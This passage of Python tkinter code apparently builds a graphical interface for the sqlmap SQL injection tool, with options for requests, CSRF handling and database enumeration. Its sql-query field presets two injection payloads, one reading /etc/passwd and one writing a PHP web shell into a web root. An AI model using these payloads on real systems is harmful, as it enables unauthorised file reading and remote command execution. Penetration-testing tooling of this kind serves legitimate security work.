        self.chk_tor_type = ttk.Checkbutton(data_lf_2)
        self.chk_tor_type_var = tkinter.StringVar()
        self.chk_tor_type.config(text="tor-type", variable=self.chk_tor_type_var, onvalue="on",
                                 offvalue="off", command=self.f_tor_type)
        self.chk_tor_type.grid(row=11, column=0, sticky='w')
        #
        self.e_tor_type = ttk.Combobox(data_lf_2, width=60)
        self.e_tor_type_value = tkinter.StringVar()
        self.e_tor_type.config(textvariable=self.e_tor_type_value, state='disabled')
        self.e_tor_type['values'] = ('HTTP', 'HTTPS', 'SOCKS4', 'SOCKS5')
        self.e_tor_type.current(0)
        self.e_tor_type.bind('<<ComboboxSelected>>', self.f_tor_type)
        self.e_tor_type.grid(row=11, column=1, sticky='we', padx=3)
        # --check-tor         Check to see if Tor is used properly
        self.chk_tor = ttk.Checkbutton(data_lf_2)
        self.chk_tor_var = tkinter.StringVar()
        self.chk_tor.config(text="check-tor", variable=self.chk_tor_var, onvalue="on",
                            offvalue="off", command=self.f_tor)
        self.chk_tor.grid(row=12, column=0, sticky='w')
        # --delay=DELAY       Delay in seconds between each HTTP request
        self.chk_delay = ttk.Checkbutton(data_lf_2)
        self.chk_delay_var = tkinter.StringVar()
        self.chk_delay.config(text="delay", variable=self.chk_delay_var, onvalue="on",
                              offvalue="off", command=self.f_delay)
        self.chk_delay.grid(row=13, column=0, sticky='w')
        #
        self.e_delay = ttk.Combobox(data_lf_2)
        self.e_delay_value = tkinter.StringVar()
        self.e_delay.config(textvariable=self.e_delay_value, state='disabled', width=60)
        self.e_delay['values'] = ('0.5', '1', '1.5')
        self.e_delay.current(0)
        self.e_delay.bind('<<ComboboxSelected>>', self.f_delay)
        self.e_delay.grid(row=13, column=1, sticky='we', padx=3)
        self.e_delay.columnconfigure(0, weight=1)
        # --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
        self.chk_timeout = ttk.Checkbutton(data_lf_2)
        self.chk_time_out_var = tkinter.StringVar()
        self.chk_timeout.config(text="timeout", variable=self.chk_time_out_var, onvalue="on",
                                offvalue="off", command=self.f_time_out)
        self.chk_timeout.grid(row=14, column=0, sticky='w')
        #
        self.e_time_out = ttk.Combobox(data_lf_2)
        self.e_timeout_value = tkinter.StringVar()
        self.e_time_out.config(textvariable=self.e_timeout_value, state='disabled', width=60)
        self.e_time_out['values'] = ('15', '20', '25', '30')
        self.e_time_out.current(0)
        self.e_time_out.bind('<<ComboboxSelected>>', self.f_time_out)
        self.e_time_out.grid(row=14, column=1, sticky='we', padx=3)
        self.e_time_out.columnconfigure(0, weight=1)
        # --retries=RETRIES   Retries when the connection timeouts (default 3)
        self.chk_retries = ttk.Checkbutton(data_lf_2)
        self.chk_retries_var = tkinter.StringVar()
        self.chk_retries.config(text="retries", variable=self.chk_retries_var, onvalue="on",
                                offvalue="off", command=self.f_retries)
        self.chk_retries.grid(row=15, column=0, sticky='w')
        #
        self.e_retries = ttk.Combobox(data_lf_2)
        self.e_retries_value = tkinter.StringVar()
        self.e_retries.config(textvariable=self.e_retries_value, state='disabled', width=60)
        self.e_retries['values'] = ('4', '5', '6')
        self.e_retries.current(0)
        self.e_retries.bind('<<ComboboxSelected>>', self.f_retries)
        self.e_retries.grid(row=15, column=1, sticky='we', padx=3)
        self.e_retries.columnconfigure(0, weight=1)
        # --randomize=RPARAM  Randomly change value for given parameter(s)
        self.chk_randomize = ttk.Checkbutton(data_lf_2)
        self.chk_randomize_var = tkinter.StringVar()
        self.chk_randomize.config(text="randomize", variable=self.chk_randomize_var, onvalue="on",
                                  offvalue="off", command=self.f_randomize)
        self.chk_randomize.grid(row=16, column=0, sticky='w')
        #
        self.e_randomize = ttk.Combobox(data_lf_2, width=60)
        self.e_randomize_value = tkinter.StringVar()
        self.e_randomize.config(textvariable=self.e_randomize_value, state='disabled')
        self.e_randomize['values'] = 'id2=foo,bar,tre,sat'
        self.e_randomize.current(0)
        self.e_randomize.bind('<<ComboboxSelected>>', self.f_randomize)
        self.e_randomize.grid(row=16, column=1, sticky='we', padx=3)
        self.e_randomize.columnconfigure(0, weight=1)
        # DATA 3
        data_lf_3 = ttk.Labelframe(data3, text='')
        data_lf_3.grid(row=0, column=0, pady=10, ipadx=3, ipady=3, sticky='we')
        # --safe-url=SAFURL   Url address to visit frequently during testing
        self.chk_safe_url = ttk.Checkbutton(data_lf_3)
        self.chk_safe_url_var = tkinter.StringVar()
        self.chk_safe_url.config(text="safe-url", variable=self.chk_safe_url_var, onvalue="on",
                                 offvalue="off", command=self.f_safe_url)
        self.chk_safe_url.grid(row=0, column=0, sticky='w')
        #
        self.e_safe_url = ttk.Entry(data_lf_3, width=60)
        self.e_safe_url.grid(row=0, column=1, sticky='we', padx=3)
        self.e_safe_url.columnconfigure(0, weight=1)
        # --safe-post=SAFE..  POST data to send to a safe URL
        self.chk_safe_post = ttk.Checkbutton(data_lf_3)
        self.chk_safe_post_var = tkinter.StringVar()
        self.chk_safe_post.config(text="safe-post", variable=self.chk_safe_post_var, onvalue="on",
                                  offvalue="off", command=self.f_safe_post)
        self.chk_safe_post.grid(row=1, column=0, sticky='w')
        #
        self.e_safe_post = ttk.Entry(data_lf_3, width=60)
        self.e_safe_post.grid(row=1, column=1, sticky='we', padx=3)
        self.e_safe_post.columnconfigure(0, weight=1)
        # --safe-req=SAFER..  Load safe HTTP request from a file
        self.chk_safe_req = ttk.Checkbutton(data_lf_3)
        self.chk_safe_req_var = tkinter.StringVar()
        self.chk_safe_req.config(text="safe-req", variable=self.chk_safe_req_var, onvalue="on",
                                 offvalue="off", command=self.f_safe_req)
        self.chk_safe_req.grid(row=2, column=0, sticky='w')
        #
        self.e_safe_req = ttk.Entry(data_lf_3, width=60)
        self.e_safe_req.grid(row=2, column=1, sticky='we', padx=3)
        self.e_safe_req.columnconfigure(0, weight=1)
        # --safe-freq=SAFE..  Test requests between two visits to a given safe URL
        self.chk_safe_freq = ttk.Checkbutton(data_lf_3)
        self.chk_safe_freq_var = tkinter.StringVar()
        self.chk_safe_freq.config(text="safe-freq", variable=self.chk_safe_freq_var, onvalue="on",
                                  offvalue="off", command=self.f_safe_freq)
        self.chk_safe_freq.grid(row=3, column=0, sticky='w')
        #
        self.e_safe_freq = ttk.Entry(data_lf_3, width=60)
        self.e_safe_freq.grid(row=3, column=1, sticky='we', padx=3)
        self.e_safe_freq.columnconfigure(0, weight=1)
        # --skip-urlencode    Skip URL encoding of POST data
        self.chk_skip_urlencode = ttk.Checkbutton(data_lf_3)
        self.chk_skip_urlencode_var = tkinter.StringVar()
        self.chk_skip_urlencode.config(text="skip-urlencode", variable=self.chk_skip_urlencode_var, onvalue="on",
                                       offvalue="off", command=self.f_skip_urlencode)
        self.chk_skip_urlencode.grid(row=4, column=0, sticky='w')
        # --csrf-token=CSR..  Parameter used to hold anti-CSRF token
        self.chk_csrf_token = ttk.Checkbutton(data_lf_3)
        self.chk_csrf_token_var = tkinter.StringVar()
        self.chk_csrf_token.config(text="csrf-token", variable=self.chk_csrf_token_var, onvalue="on",
                                   offvalue="off", command=self.f_csrf_token)
        self.chk_csrf_token.grid(row=5, column=0, sticky='w')
        #
        self.e_csrf_token = ttk.Entry(data_lf_3, width=60)
        self.e_csrf_token.grid(row=5, column=1, sticky='we', padx=3)
        self.e_csrf_token.columnconfigure(0, weight=1)
        # --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit
        self.chk_csrf_method = ttk.Checkbutton(data_lf_3)
        self.chk_csrf_method_var = tkinter.StringVar()
        self.chk_csrf_method.config(text="csrf-method", variable=self.chk_csrf_method_var, onvalue="on",
                                    offvalue="off", command=self.f_csrf_method)
        self.chk_csrf_method.grid(row=6, column=0, sticky='w')
        #
        self.e_csrf_method = ttk.Combobox(data_lf_3)
        self.e_csrf_method_value = tkinter.StringVar()
        self.e_csrf_method.config(textvariable=self.e_csrf_method_value, state='disabled', width=10)
        self.e_csrf_method['values'] = ('POST', 'HELLO', 'HELO', 'EHLO', 'LIST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS',
                                        'TRACE', 'TRACK', 'PATCH',
                                        'CONNECT', 'DEBUG', 'GET', '   GET', 'get')
        self.e_csrf_method.current(0)
        self.e_csrf_method.bind('<<ComboboxSelected>>', self.f_csrf_method)
        self.e_csrf_method.grid(row=6, column=1, sticky='w', padx=3)
        # --csrf-data=POST data to send during anti-CSRF token page visit
        self.chk_csrf_data_method = ttk.Checkbutton(data_lf_3)
        self.chk_csrf_data_method_var = tkinter.StringVar()
        self.chk_csrf_data_method.config(text="csrf-data", variable=self.chk_csrf_data_method_var, onvalue="on",
                                         offvalue="off", command=self.f_csrf_data)
        self.chk_csrf_data_method.grid(row=7, column=0, sticky='w')
        #
        self.e_csrf_data = ttk.Entry(data_lf_3, width=60)
        self.e_csrf_data.grid(row=7, column=1, sticky='we', padx=3)
        self.e_csrf_data.columnconfigure(0, weight=1)
        # --csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token
        self.chk_csrf_url = ttk.Checkbutton(data_lf_3)
        self.chk_csrf_url_var = tkinter.StringVar()
        self.chk_csrf_url.config(text="csfr-url", variable=self.chk_csrf_url_var, onvalue="on",
                                 offvalue="off", command=self.f_csrf_url)
        self.chk_csrf_url.grid(row=8, column=0, sticky='w')
        #
        self.e_csrf_url = ttk.Entry(data_lf_3, width=60)
        self.e_csrf_url.grid(row=8, column=1, sticky='we', padx=3)
        self.e_csrf_url.columnconfigure(0, weight=1)
        # --csrf-retries    Retries for anti-CSRF token retrieval
        self.chk_csrf_retries = ttk.Checkbutton(data_lf_3)
        self.chk_csrf_retries_var = tkinter.StringVar()
        self.chk_csrf_retries.config(text="csrf-retries", variable=self.chk_csrf_retries_var, onvalue="on",
                                     offvalue="off", command=self.f_csrf_retries)
        self.chk_csrf_retries.grid(row=9, column=0, sticky='w')
        #
        self.e_csrf_retries = ttk.Combobox(data_lf_3)
        self.e_csrf_retries_value = tkinter.StringVar()
        self.e_csrf_retries.config(textvariable=self.e_csrf_retries_value, state='disabled', width=5)
        self.e_csrf_retries['values'] = ('4', '5', '6')
        self.e_csrf_retries.current(0)
        self.e_csrf_retries.bind('<<ComboboxSelected>>', self.f_csrf_retries)
        self.e_csrf_retries.grid(row=9, column=1, sticky='w', padx=3)
        # --force-ssl         Force usage of SSL/HTTPS requests
        self.chk_force_ssl = ttk.Checkbutton(data_lf_3)
        self.chk_force_ssl_var = tkinter.StringVar()
        self.chk_force_ssl.config(text="force-ssl", variable=self.chk_force_ssl_var, onvalue="on",
                                  offvalue="off", command=self.f_force_ssl)
        self.chk_force_ssl.grid(row=10, column=0, sticky='w')
        # --hpp      Use HTTP parameter pollution
        self.chk_hpp = ttk.Checkbutton(data_lf_3)
        self.chk_hpp_var = tkinter.StringVar()
        self.chk_hpp.config(text="hpp", variable=self.chk_hpp_var, onvalue="on",
                            offvalue="off", command=self.f_hpp)
        self.chk_hpp.grid(row=11, column=0, sticky='w')
        # --eval=EVALCODE     Evaluate provided Python code before the request (e.g."import hashlib;id2=hashlib.md5(id)
        self.chk_eval_code = ttk.Checkbutton(data_lf_3)
        self.chk_eval_code_var = tkinter.StringVar()
        self.chk_eval_code.config(text="eval", variable=self.chk_eval_code_var, onvalue="on",
                                  offvalue="off", command=self.f_eval_code)
        self.chk_eval_code.grid(row=12, column=0, sticky='w')
        #
        self.e_eval_code = ttk.Combobox(data_lf_3, width=60)
        self.e_eval_code_value = tkinter.StringVar()
        self.e_eval_code.config(textvariable=self.e_eval_code_value, state='disabled')
        self.e_eval_code['values'] = "import%20hashlib;id2=hashlib.md5(id).hexdigest()"
        self.e_eval_code.current(0)
        self.e_eval_code.bind('<<ComboboxSelected>>', self.f_eval_code)
        self.e_eval_code.grid(row=12, column=1, sticky='we', padx=3)
        self.e_eval_code.columnconfigure(0, weight=1)
        # --chunked            Use HTTP chunked transfer encoded (POST) requests
        self.chk_chunked = ttk.Checkbutton(data_lf_3)
        self.chk_chunked_var = tkinter.StringVar()
        self.chk_chunked.config(text="chunked", variable=self.chk_chunked_var, onvalue="on",
                                offvalue="off", command=self.f_chunked)
        self.chk_chunked.grid(row=13, column=0, sticky='w')
        # ENUMERATION_1
        enumerate_lf = ttk.Labelframe(enumeration_f, text='')
        enumerate_lf.grid(row=0, column=0, ipadx=3, padx=3, pady=3, sticky='nw')
        # --current-user      Retrieve DBMS current user
        self.chk_current_user = ttk.Checkbutton(enumerate_lf)
        self.chk_current_user_var = tkinter.StringVar()
        self.chk_current_user.config(text="current-user", variable=self.chk_current_user_var, onvalue="on",
                                     offvalue="off", command=self.f_current_user)
        self.chk_current_user.grid(row=0, column=0, sticky='w')
        # --current-db        Retrieve DBMS current database
        self.chk_current_db = ttk.Checkbutton(enumerate_lf)
        self.chk_current_db_var = tkinter.StringVar()
        self.chk_current_db.config(text="current-db", variable=self.chk_current_db_var, onvalue="on",
                                   offvalue="off", command=self.f_current_db)
        self.chk_current_db.grid(row=1, column=0, sticky='w')
        # -a, --all           Retrieve everything
        self.chk_all = ttk.Checkbutton(enumerate_lf)
        self.chk_all_var = tkinter.StringVar()
        self.chk_all.config(text="all", variable=self.chk_all_var, onvalue="on",
                            offvalue="off", command=self.f_all)
        self.chk_all.grid(row=2, column=0, sticky='w')
        # -passwords         Enumerate DBMS users password hashes
        self.chk_passwords = ttk.Checkbutton(enumerate_lf)
        self.chk_passwords_var = tkinter.StringVar()
        self.chk_passwords.config(text="passwords", variable=self.chk_passwords_var, onvalue="on",
                                  offvalue="off", command=self.f_passwords)
        self.chk_passwords.grid(row=0, column=1, sticky='w')
        # --privileges        Enumerate DBMS users privileges
        self.chk_privileges = ttk.Checkbutton(enumerate_lf)
        self.chk_privileges_var = tkinter.StringVar()
        self.chk_privileges.config(text="privileges", variable=self.chk_privileges_var, onvalue="on",
                                   offvalue="off", command=self.f_privileges)
        self.chk_privileges.grid(row=1, column=1, sticky='w')
        # --comments          Retrieve DBMS comments
        self.chk_comments = ttk.Checkbutton(enumerate_lf)
        self.chk_comments_var = tkinter.StringVar()
        self.chk_comments.config(text="comments", variable=self.chk_comments_var, onvalue="on",
                                 offvalue="off", command=self.f_comments)
        self.chk_comments.grid(row=2, column=1, sticky='w')
        # --tables            Enumerate DBMS database tables
        self.chk_tables = ttk.Checkbutton(enumerate_lf)
        self.chk_tables_var = tkinter.StringVar()
        self.chk_tables.config(text="tables", variable=self.chk_tables_var, onvalue="on",
                               offvalue="off", command=self.f_tables)
        self.chk_tables.grid(row=0, column=2, sticky='w')
        # --columns           Enumerate DBMS database table columns
        self.chk_columns = ttk.Checkbutton(enumerate_lf)
        self.chk_columns_var = tkinter.StringVar()
        self.chk_columns.config(text="columns", variable=self.chk_columns_var, onvalue="on",
                                offvalue="off", command=self.f_columns)
        self.chk_columns.grid(row=1, column=2, sticky='w')
        # --hostname          Retrieve DBMS server hostname
        self.chk_host_name = ttk.Checkbutton(enumerate_lf)
        self.chk_host_name_var = tkinter.StringVar()
        self.chk_host_name.config(text="hostname", variable=self.chk_host_name_var, onvalue="on",
                                  offvalue="off", command=self.f_host_name)
        self.chk_host_name.grid(row=2, column=2, sticky='w')
        # ENUMERATION_2
        enumerate_lf_2 = ttk.Labelframe(enumeration_f, text='')
        enumerate_lf_2.grid(row=1, column=0, ipadx=3, padx=3, pady=3, sticky='nw')
        self.chk_current_db.grid(row=1, column=0, sticky='w')
        # --is-dba   Detect if the DBMS current user is DBA
        self.chk_is_dba = ttk.Checkbutton(enumerate_lf_2)
        self.chk_is_dba_var = tkinter.StringVar()
        self.chk_is_dba.config(text="is-dba", variable=self.chk_is_dba_var, onvalue="on",
                               offvalue="off", command=self.f_is_dba)
        self.chk_is_dba.grid(row=2, column=0, sticky='w')
        # --users             Enumerate DBMS users
        self.chk_users = ttk.Checkbutton(enumerate_lf_2)
        self.chk_users_var = tkinter.StringVar()
        self.chk_users.config(text="users", variable=self.chk_users_var, onvalue="on",
                              offvalue="off", command=self.f_users)
        self.chk_users.grid(row=3, column=0, sticky='w')
        # --roles             Enumerate DBMS users roles
        self.chk_roles = ttk.Checkbutton(enumerate_lf_2)
        self.chk_roles_var = tkinter.StringVar()
        self.chk_roles.config(text="roles", variable=self.chk_roles_var, onvalue="on",
                              offvalue="off", command=self.f_roles)
        self.chk_roles.grid(row=2, column=1, sticky='w')
        # -dbs               Enumerate DBMS databases
        self.chk_dbs = ttk.Checkbutton(enumerate_lf_2)
        self.chk_dbs_var = tkinter.StringVar()
        self.chk_dbs.config(text="dbs", variable=self.chk_dbs_var, onvalue="on",
                            offvalue="off", command=self.f_dbs)
        self.chk_dbs.grid(row=3, column=1, sticky='w')
        # --schema            Enumerate DBMS schema
        self.chk_schema = ttk.Checkbutton(enumerate_lf_2)
        self.chk_schema_var = tkinter.StringVar()
        self.chk_schema.config(text="schema", variable=self.chk_schema_var, onvalue="on",
                               offvalue="off", command=self.f_schema)
        self.chk_schema.grid(row=2, column=2, sticky='w')
        # --count             Retrieve number of entries for table(s)
        self.chk_count = ttk.Checkbutton(enumerate_lf_2)
        self.chk_count_var = tkinter.StringVar()
        self.chk_count.config(text="count", variable=self.chk_count_var, onvalue="on",
                              offvalue="off", command=self.f_count)
        self.chk_count.grid(row=3, column=2, sticky='w')
        # ENUMIRATION_3
        dump_lf = ttk.Labelframe(enumeration_f, text='')
        dump_lf.grid(row=0, column=1, ipadx=3, pady=3, padx=3, sticky='nw')
        # -b, --banner        Retrieve DBMS banner
        self.chk_banner = ttk.Checkbutton(dump_lf)
        self.f_banner_var = tkinter.StringVar()
        self.chk_banner.config(text="banner", variable=self.f_banner_var, onvalue="on",
                               offvalue="off", command=self.f_banner)
        self.chk_banner.grid(row=0, column=0, sticky='w')
        # --dump              Dump DBMS database table entries
        self.chk_dump = ttk.Checkbutton(dump_lf)
        self.chk_dump_var = tkinter.StringVar()
        self.chk_dump.config(text="dump", variable=self.chk_dump_var, onvalue="on",
                             offvalue="off", command=self.f_dump)
        self.chk_dump.grid(row=1, column=0, sticky='w')
        # --search            Search column(s), table(s) and/or database name(s)
        self.chk_search = ttk.Checkbutton(dump_lf)
        self.chk_search_var = tkinter.StringVar()
        self.chk_search.config(text="search", variable=self.chk_search_var, onvalue="on",
                               offvalue="off", command=self.f_search)
        self.chk_search.grid(row=2, column=0, sticky='w')
        # --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
        self.chk_exclude_sysdbs = ttk.Checkbutton(dump_lf)
        self.chk_exclude_sys_dbs_var = tkinter.StringVar()
        self.chk_exclude_sysdbs.config(text="exclude-sysdbs", variable=self.chk_exclude_sys_dbs_var, onvalue="on",
                                       offvalue="off", command=self.f_exclude_sys_dbs)
        self.chk_exclude_sysdbs.grid(row=0, column=1, sticky='w', padx=3)
        # --first=FIRSTCHAR   First query output word character to retrieve
        self.chk_first = ttk.Checkbutton(dump_lf)
        self.chk_first_var = tkinter.StringVar()
        self.chk_first.config(text="first CHAR", variable=self.chk_first_var, onvalue="on",
                              offvalue="off", command=self.f_first)
        self.chk_first.grid(row=1, column=1, sticky='w', padx=3)
        #
        self.entry_first = ttk.Entry(dump_lf)
        self.entry_first.config(text="", textvariable="", width=3)
        self.entry_first.grid(row=1, column=2, sticky='w')
        # --last=LASTCHAR     Last query output word character to retrieve
        self.chk_last = ttk.Checkbutton(dump_lf)
        self.chk_last_var = tkinter.StringVar()
        self.chk_last.config(text="last CHAR", variable=self.chk_last_var, onvalue="on",
                             offvalue="off", command=self.f_last)
        self.chk_last.grid(row=2, column=1, sticky='w', padx=3)
        #
        self.entry_last = ttk.Entry(dump_lf)
        self.entry_last.config(text="", textvariable="", width=3)
        self.entry_last.grid(row=2, column=2, sticky='w')
        # ENUMIRATION_4
        dump_lf_4 = ttk.Labelframe(enumeration_f, text='')
        dump_lf_4.grid(row=1, column=1, ipadx=3, pady=3, padx=3, sticky='nw')
        # --dump-all          Dump all DBMS databases tables entries
        self.chk_dump_all = ttk.Checkbutton(dump_lf_4)
        self.chk_dump_all_var = tkinter.StringVar()
        self.chk_dump_all.config(text="dump-all", variable=self.chk_dump_all_var, onvalue="on",
                                 offvalue="off", command=self.f_dump_all)
        self.chk_dump_all.grid(row=0, column=0, sticky='w')
        # --statements        Retrieve SQL statements being run on DBMS
        self.chk_statements = ttk.Checkbutton(dump_lf_4)
        self.chk_statements_var = tkinter.StringVar()
        self.chk_statements.config(text="statements", variable=self.chk_statements_var, onvalue="on",
                                   offvalue="off", command=self.f_statements)
        self.chk_statements.grid(row=0, column=1, sticky='w')
        # --pivot-column Pivot column name
        self.chk_pivot = ttk.Checkbutton(dump_lf_4)
        self.chk_pivot_var = tkinter.StringVar()
        self.chk_pivot.config(text="pivot-column", variable=self.chk_pivot_var, onvalue="on",
                              offvalue="off", command=self.f_pivot)
        self.chk_pivot.grid(row=1, column=0, sticky='w')
        #
        self.e_pivot = ttk.Entry(dump_lf_4, width=10)
        self.e_pivot.grid(row=1, column=1, sticky='w', padx=3)
        # Block #1
        dtc_lf = ttk.Labelframe(enumeration_f, text='')
        dtc_lf.grid(row=2, column=0, pady=10, padx=5, sticky='w', columnspan=5)
        dtc_lf.columnconfigure(0, weight=1)
        # -D DB               DBMS database to enumerate
        self.e_database_enumerate = ttk.Entry(dtc_lf, width=52)
        self.e_database_enumerate.config(text="", textvariable="")
        self.e_database_enumerate.grid(row=0, column=1, sticky='w', padx=3)
        #
        self.chk_database = ttk.Checkbutton(dtc_lf)
        self.chk_database_enumerate_var = tkinter.StringVar()
        self.chk_database.config(text="DB", variable=self.chk_database_enumerate_var, onvalue="on",
                                 offvalue="off", command=self.f_database_enumerate)
        self.chk_database.grid(row=0, column=0, sticky='w')
        # -T TBL              DBMS database table to enumerate
        self.e_table = ttk.Entry(dtc_lf, width=52)
        self.e_table.config(text="", textvariable="")
        self.e_table.grid(row=1, column=1, sticky='w', padx=3)
        self.chk_table = ttk.Checkbutton(dtc_lf)
        self.chk_table_var = tkinter.StringVar()
        self.chk_table.config(text="TBL", variable=self.chk_table_var, onvalue="on",
                              offvalue="off", command=self.f_table)
        self.chk_table.grid(row=1, column=0, sticky='w')
        # -C COL              DBMS database table column to enumerate
        self.e_column = ttk.Entry(dtc_lf, width=52)
        self.e_column.config(text="", textvariable="")
        self.e_column.grid(row=2, column=1, sticky='w', padx=3)
        #
        self.chk_column = ttk.Checkbutton(dtc_lf)
        self.chk_column_var = tkinter.StringVar()
        self.chk_column.config(text="COL", variable=self.chk_column_var, onvalue="on",
                               offvalue="off", command=self.f_column)
        self.chk_column.grid(row=2, column=0, sticky='w')
        # -U USER             DBMS user to enumerate
        self.chk_user = ttk.Checkbutton(dtc_lf)
        self.chk_user_var = tkinter.StringVar()
        self.chk_user.config(text="USER", variable=self.chk_user_var, onvalue="on",
                             offvalue="off", command=self.f_user)
        self.chk_user.grid(row=3, column=0, sticky='w')
        #
        self.e_user = ttk.Entry(dtc_lf, width=52)
        self.e_user.config(text="", textvariable="")
        self.e_user.grid(row=3, column=1, sticky='w', padx=3)
        # -X EXCLUDE          DBMS database identifier(s) to not enumerate
        self.chk_exclude = ttk.Checkbutton(dtc_lf)
        self.chk_exclude_var = tkinter.StringVar()
        self.chk_exclude.config(text="EXCLUDE", variable=self.chk_exclude_var, onvalue="on",
                                offvalue="off", command=self.f_exclude)
        self.chk_exclude.grid(row=4, column=0, sticky='w')
        #
        self.e_exclude = ttk.Combobox(dtc_lf, width=52)
        self.e_exclude_value = tkinter.StringVar()
        self.e_exclude.config(textvariable=self.e_exclude_value, state='disabled')
        self.e_exclude['values'] = ('prefix_.*')
        self.e_exclude.current(0)
        self.e_exclude.bind('<<ComboboxSelected>>', self.f_exclude)
        self.e_exclude.grid(row=4, column=1, sticky='w', padx=3)
        # --where=DUMPWHERE   Use WHERE condition while table dumping
        self.chk_where_dump = ttk.Checkbutton(dtc_lf)
        self.chk_where_dump_var = tkinter.StringVar()
        self.chk_where_dump.config(text="where", variable=self.chk_where_dump_var, onvalue="on",
                                   offvalue="off", command=self.f_where_dump)
        self.chk_where_dump.grid(row=5, column=0, sticky='w')
        #
        self.e_where_dump = ttk.Combobox(dtc_lf, width=52)
        self.e_where_dump_value = tkinter.StringVar()
        self.e_where_dump.config(textvariable=self.e_where_dump_value, state='disabled')
        self.e_where_dump['values'] = ('artist_id=1 AND adesc LIKE \'%Lorem%\'',
                                       'artist_id=1 AND adesc LIKE \'%Lorem%\' AND user LIKE \'%Api%\'')
        self.e_where_dump.current(0)
        self.e_where_dump.bind('<<ComboboxSelected>>', self.f_where_dump)
        self.e_where_dump.grid(row=5, column=1, sticky='w', padx=3)
        # LIMIT
        # --start=LIMITSTART  First dump table entry to retrieve
        # --stop=LIMITSTOP    Last dump table entry to retrieve
        self.chk_start = ttk.Checkbutton(dtc_lf)
        self.chk_start_var = tkinter.StringVar()
        self.chk_start.config(text="Limit", variable=self.chk_start_var, onvalue="on",
                              offvalue="off", command=self.f_start_stop)
        self.chk_start.grid(row=6, column=0, sticky='w')
        #
        self.start_var = tkinter.StringVar()
        self.start_var.set("start,stop")
        self.e_start = ttk.Entry(dtc_lf, width=52)
        self.e_start.config(text="", textvariable=self.start_var)
        self.e_start.grid(row=6, column=1, sticky='w', padx=3)
        # SQLQUERY START PAINT
        sql_query_lf = ttk.Labelframe(enumeration_f, text='')
        sql_query_lf.grid(row=3, column=0, pady=10, padx=5, sticky='we', columnspan=5)
        sql_query_lf.columnconfigure(0, weight=1)
        # --sql-query=QUERY   SQL statement to be executed
        self.chk_sql_query = ttk.Checkbutton(sql_query_lf)
        self.chk_sql_query_var = tkinter.StringVar()
        self.chk_sql_query.config(text="sql-query", variable=self.chk_sql_query_var, onvalue="on",
                                  offvalue="off", command=self.f_sql_query)
        self.chk_sql_query.grid(row=0, column=0, sticky='w')
        #
        self.e_sql_query = ttk.Combobox(sql_query_lf, width=52)
        self.e_sql_query_value = tkinter.StringVar()
        self.e_sql_query.config(textvariable=self.e_sql_query_value, state='disabled')
        self.e_sql_query['values'] = (
            # Check read/write rights and try to read the file
            'union select null,load_file(\'/etc/passwd\'),null,null,null',
            # Inject your code in .php file
            'union select 1,"<?php system($_REQUEST[\'cmd\'])?>\",3,4 INTO OUTFILE \" '
            '/var/www/website/public_html/shell.php\"'
        )
        self.e_sql_query.current(0)
        self.e_sql_query.bind('<<ComboboxSelected>>', self.f_sql_query)
        self.e_sql_query.grid(row=0, column=1, sticky='w', padx=3)
        # --sql-shell         Prompt for an interactive SQL shell
        self.chk_sql_shell = ttk.Checkbutton(sql_query_lf)
        self.chk_sql_shell_var = tkinter.StringVar()
        self.chk_sql_shell.config(text="sql-shell", variable=self.chk_sql_shell_var, onvalue="on",
                                  offvalue="off", command=self.f_sql_shell)
        self.chk_sql_shell.grid(row=1, column=0, sticky='w')
        # --sql-file=SQLFILE  Execute SQL statements from given file(s)
        self.chk_sql_file = ttk.Checkbutton(sql_query_lf)
        self.chk_sql_file_var = tkinter.StringVar()
        self.chk_sql_file.config(text="sql-file", variable=self.chk_sql_file_var, onvalue="on",
                                 offvalue="off", command=self.f_sql_file)
        self.chk_sql_file.grid(row=2, column=0, sticky='w')
        #
        self.var_sql_file = tkinter.StringVar()
        self.entry_sql_file = ttk.Entry(sql_query_lf, width=52)
        self.entry_sql_file.config(text="", textvariable=self.var_sql_file)
        self.entry_sql_file.grid(row=2, column=1, sticky='w', padx=3)
        self.entry_sql_file.columnconfigure(0, weight=1)
        # BRUTEFORCE
        char_bf_lf = ttk.Labelframe(enumeration_f, text='Brute force')
        char_bf_lf.grid(row=0, column=2, padx=3, pady=3, sticky='nw')
        # --common-tables     Check existence of common tables
        self.chk_common_tables = ttk.Checkbutton(char_bf_lf)
        self.chk_common_tables_var = tkinter.StringVar()
        self.chk_common_tables.config(text="common-tables", variable=self.chk_common_tables_var, onvalue="on",
                                      offvalue="off", command=self.f_common_tables)
        self.chk_common_tables.grid(row=0, column=0, sticky='w')
        # --common-columns    Check existence of common columns
        self.chk_common_columns = ttk.Checkbutton(char_bf_lf)
        self.chk_common_columns_var = tkinter.StringVar()
        self.chk_common_columns.config(text="common-columns", variable=self.chk_common_columns_var, onvalue="on",
                                       offvalue="off", command=self.f_common_columns)
        self.chk_common_columns.grid(row=1, column=0, sticky='w')
        # --common-files      Check existence of common files
        self.chk_common_files = ttk.Checkbutton(char_bf_lf)
        self.chk_common_files_var = tkinter.StringVar()
        self.chk_common_files.config(text="common-files", variable=self.chk_common_files_var, onvalue="on",
                                     offvalue="off", command=self.f_common_files)
        self.chk_common_files.grid(row=2, column=0, sticky='w')
        # User-defined function injection
        char_bf_lf = ttk.Labelframe(enumeration_f, text='User-defined\nfunction injection')
        char_bf_lf.grid(row=1, column=2, padx=3, pady=3, sticky='nw')
        # --udf-inject     Inject custom user-defined functions
        self.chk_udf_inject = ttk.Checkbutton(char_bf_lf)
        self.chk_udf_inject_var = tkinter.StringVar()
        self.chk_udf_inject.config(text="udf-inject", variable=self.chk_udf_inject_var, onvalue="on",
                                   offvalue="off", command=self.f_udf_inject)
        self.chk_udf_inject.grid(row=0, column=0, sticky='w')
        # --shared-lib=SHLIB   Local path of the shared library
        self.chk_shared_lib = ttk.Checkbutton(char_bf_lf)
        self.chk_shared_lib_var = tkinter.StringVar()
        self.chk_shared_lib.config(text="shared-lib", variable=self.chk_shared_lib_var, onvalue="on",
                                   offvalue="off", command=self.f_shared_lib)
        self.chk_shared_lib.grid(row=1, column=0, sticky='w')
        #
        self.e_shared_lib = ttk.Entry(char_bf_lf)
        self.e_shared_lib.config(text="", textvariable="", width=3)
        self.e_shared_lib.grid(row=1, column=1, sticky='we', padx=3)
        # ACCESS
        access_f = ttk.Notebook(file_f)
        file_acc = ttk.Frame(access_f)
        os_acc = ttk.Frame(access_f)
        win_reg_acc = ttk.Frame(access_f)
